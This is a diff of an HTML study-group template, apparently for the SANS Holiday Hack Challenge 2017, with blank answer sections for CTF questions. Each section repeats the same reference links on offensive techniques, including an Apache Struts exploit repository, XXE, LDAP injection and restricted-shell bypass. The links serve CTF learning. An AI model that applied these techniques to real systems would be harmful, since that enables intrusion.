-<li><a id="how-to-find-the-terminal"></a><a id="orga7ce98d"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-7-1-2" name="sec-5-7-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orga013ae4"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-7-1-3" name="sec-5-7-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -2139,42 +2119,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org20cb086"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-7-1-4" name="sec-5-7-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="orga5c2375"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-7-1-5" name="sec-5-7-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2182,8 +2170,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org8a8f56f"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-7-1-6" name="sec-5-7-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -2194,24 +2182,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org0817230"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-7-1-7" name="sec-5-7-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org16d63c4"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-7-1-8" name="sec-5-7-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org62323bd"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-7-1-9" name="sec-5-7-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -2219,28 +2207,25 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="org3b1f88c"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-7-1-10" name="sec-5-7-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org2f7febe" class="outline-3">
-<h3 id="org2f7febe">Winter Wonder Landing</h3>
-<div class="outline-text-3" id="text-org2f7febe">
-</div>
-<div id="outline-container-orgb9c8072" class="outline-4">
-<h4 id="answer-template"><a id="orgb9c8072"></a>Answer Template</h4>
+<div id="outline-container-sec-5-8" class="outline-3">
+<h3 id="sec-5-8">Winter Wonder Landing</h3>
+<div class="outline-text-3" id="text-5-8">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-8-1" name="sec-5-8-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org93b310e"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-8-1-1" name="sec-5-8-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
                                  |
                                \ ' /
@@ -2274,16 +2259,16 @@ Find and run the elftalkd binary to complete this challenge.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="org0ac9eaa"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-8-1-2" name="sec-5-8-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org7fed709"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-8-1-3" name="sec-5-8-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -2309,42 +2294,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org10749a6"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-8-1-4" name="sec-5-8-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org79634e4"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-8-1-5" name="sec-5-8-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2352,8 +2345,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orgd9ce2f1"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-8-1-6" name="sec-5-8-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -2364,24 +2357,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org2c99c9f"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-8-1-7" name="sec-5-8-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org98fc64d"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-8-1-8" name="sec-5-8-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org02468b9"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-8-1-9" name="sec-5-8-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -2389,43 +2382,40 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="org69253b7"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-8-1-10" name="sec-5-8-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
 </div>
-<div id="outline-container-org9ea9753" class="outline-2">
-<h2 id="org9ea9753">Answers</h2>
-<div class="outline-text-2" id="text-org9ea9753">
-</div>
-<div id="outline-container-orgf47e261" class="outline-3">
-<h3 id="orgf47e261">Question 1</h3>
-<div class="outline-text-3" id="text-orgf47e261">
-</div>
-<div id="outline-container-org2aa7cab" class="outline-4">
-<h4 id="answer-template"><a id="org2aa7cab"></a>Answer Template</h4>
+<div id="outline-container-sec-6" class="outline-2">
+<h2 id="sec-6">Answers</h2>
+<div class="outline-text-2" id="text-6">
+</div><div id="outline-container-sec-6-1" class="outline-3">
+<h3 id="sec-6-1">Question 1</h3>
+<div class="outline-text-3" id="text-6-1">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-1-1" name="sec-6-1-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org219a5bd"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-1-1-1" name="sec-6-1-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Visit the North Pole and Beyond at the Winter Wonder Landing Level to
 collect the first page of The Great Book using a giant snowball. What
-is the title of that page?</li>
+is the title of that page?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orgccae63d"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-1-1-2" name="sec-6-1-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -2451,42 +2441,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org985e076"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-1-1-3" name="sec-6-1-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="orgecc9455"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-1-1-4" name="sec-6-1-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2494,64 +2492,62 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org48952f7"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-1-1-5" name="sec-6-1-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org7daa5b7"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-1-1-6" name="sec-6-1-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org6d82c8d"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-1-1-7" name="sec-6-1-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org85a7c61"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-1-1-8" name="sec-6-1-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org5ab4121" class="outline-3">
-<h3 id="org5ab4121">Question 2</h3>
-<div class="outline-text-3" id="text-org5ab4121">
-</div>
-<div id="outline-container-orgb98abd5" class="outline-4">
-<h4 id="answer-template"><a id="orgb98abd5"></a>Answer Template</h4>
+<div id="outline-container-sec-6-2" class="outline-3">
+<h3 id="sec-6-2">Question 2</h3>
+<div class="outline-text-3" id="text-6-2">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-2-1" name="sec-6-2-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="orgc83f280"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-2-1-1" name="sec-6-2-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>Investigate the Letters to Santa application at
-<a href="https://l2s.northpolechristmastown.com/">https://l2s.northpolechristmastown.com/</a>. What is the topic of The
+<a href="https://l2s.northpolechristmastown.com">https://l2s.northpolechristmastown.com</a>. What is the topic of The
 Great Book page available in the web root of the server? What is
-Alabaster Snowball's password?</li>
+Alabaster Snowball's password?
+</li>
 </ol>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org5121e54"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-6-2-1-2" name="sec-6-2-1-2"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this system already?
 </p>
@@ -2577,42 +2573,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="org2052542"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-6-2-1-3" name="sec-6-2-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="org759b761"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-6-2-1-4" name="sec-6-2-1-4"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -2620,64 +2624,62 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org63e1302"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-6-2-1-5" name="sec-6-2-1-5"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found
 </p>
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org732c907"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-6-2-1-6" name="sec-6-2-1-6"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org3f7f56a"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-6-2-1-7" name="sec-6-2-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="orgb731891"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-6-2-1-8" name="sec-6-2-1-8"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org43ed5d1" class="outline-3">
-<h3 id="org43ed5d1">Question 3</h3>
-<div class="outline-text-3" id="text-org43ed5d1">
-</div>
-<div id="outline-container-orgc703554" class="outline-4">
-<h4 id="answer-template"><a id="orgc703554"></a>Answer Template</h4>
+<div id="outline-container-sec-6-3" class="outline-3">
+<h3 id="sec-6-3">Question 3</h3>
+<div class="outline-text-3" id="text-6-3">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-6-3-1" name="sec-6-3-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org2d49c6e"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-6-3-1-1" name="sec-6-3-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <ol class="org-ol">
 <li>The North Pole engineering team uses a Windows SMB server for sharing
 documentation and correspondence. Using your access to the Letters to
